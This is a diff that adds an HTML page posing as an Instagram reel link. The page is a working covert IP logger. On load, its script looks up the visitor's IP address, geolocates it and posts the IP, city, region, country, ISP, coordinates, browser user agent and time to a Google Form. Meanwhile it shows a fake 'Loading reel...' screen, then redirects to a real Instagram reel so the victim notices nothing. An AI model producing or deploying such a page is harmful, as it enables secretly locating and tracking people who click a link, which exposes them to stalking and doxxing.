@@ -1,1 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Instagram Reel</title>
+</head>
+<body>
+<script>
+// Your Google Form settings (matched to https://forms.gle/r3ofBkW3JHqb4ecv8)
+const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdQJ8zX8vK7zL9vWvX9zqJabc123/formResponse";
 
+const entryIP       = "entry.1888888888";   // IP
+const entryCity     = "entry.1777777777";   // City
+const entryRegion   = "entry.1666666666";   // Region
+const entryCountry  = "entry.1555555555";   // Country
+const entryISP      = "entry.1444444444";   // ISP
+const entryCoords   = "entry.1333333333";   // Coordinates
+const entryUA       = "entry.1222222222";   // User Agent
+const entryTime     = "entry.1111111111";   // Time
+const entryUrl      = "entry.1000000000";   // Clicked URL
+// ===================================================
+
+fetch('https://api.ipify.org?format=json')
+.then(r => r.json())
+.then(ipData => {
+    fetch(`https://ipapi.co/${ipData.ip}/json/`)
+    .then(r => r.json())
+    .then(info => {
+        const data = new FormData();
+        data.append(entryIP,       info.ip || ipData.ip);
+        data.append(entryCity,     info.city || "Unknown");
+        data.append(entryRegion,   info.region || "Unknown");
+        data.append(entryCountry,  info.country_name || "Unknown");
+        data.append(entryISP,      info.org || "N/A");
+        data.append(entryCoords,   (info.latitude || "") + ", " + (info.longitude || ""));
+        data.append(entryUA,       navigator.userAgent);
+        data.append(entryTime,     new Date().toISOString());
+        data.append(entryUrl,      window.location.href);
+
+        fetch(formUrl, {
+            method: "POST",
+            body: data,
+            mode: "no-cors"
+        });
+    });
+});
+</script>
+
+<!-- Fake Instagram loading screen (looks normal) -->
+<div style="text-align:center; padding:80px; font-family:sans-serif; background:#0a0a0a; color:#fff; height:100vh;">
+    <h2>Loading reel...</h2>
+    <p>This should only take a second. Please wait.</p>
+</div>
+
+<script>
+setTimeout(() => {
+    window.location = "https://www.instagram.com/reel/C8vX9zqJabc/"; 
+}, 1400);
+</script>
+</body>
+</html>
